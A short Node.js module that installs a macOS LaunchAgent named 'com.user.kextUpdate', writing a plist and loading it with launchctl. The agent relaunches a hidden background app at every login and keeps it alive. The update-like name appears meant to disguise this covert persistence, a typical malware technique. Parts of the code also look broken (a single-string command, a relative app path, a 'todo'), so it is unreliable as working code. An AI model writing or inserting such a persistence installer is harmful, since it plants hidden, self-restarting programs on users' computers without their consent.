const fs = require('fs');
const os = require('os');
const exec = require('child_process');
module.exports = {
    start: function(){
    const name = "com.user.kextUpdate";
    const username =  os.userInfo().username;
    const pathPlist = "/Users/"+username+"/Library/LaunchAgents/" + name + ".plist";
    const pathApp = "Library/LaunchAgents/kextUpdate.app/Contents/MacOS/kextUpdate"; //todo: update
    const plistData = '<?xml version="1.0" encoding="UTF-8"?>' +
        '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">' +
        '<plist version="1.0">' +
        '<dict>' +
        '<key>KeepAlive</key>'+
        '<true/>'+
        '<key>Label</key>' +
        '<string>'+name+'</string>'+
        '<key>ProgramArguments</key>' +
        '<array>' +
        '<string>open -jga '+pathApp+'</string>' +
        '</array>' +
        '<key>RunAtLoad</key>'+
        '<true/>' +
        '</dict>' +
        '</plist>';

        fs.writeFile(pathPlist, plistData, (err) => {
            if (err) throw err;
            exec.exec('launchctl load ' + pathPlist, (err, stdout) => console.log(stdout));
        });
  }
};
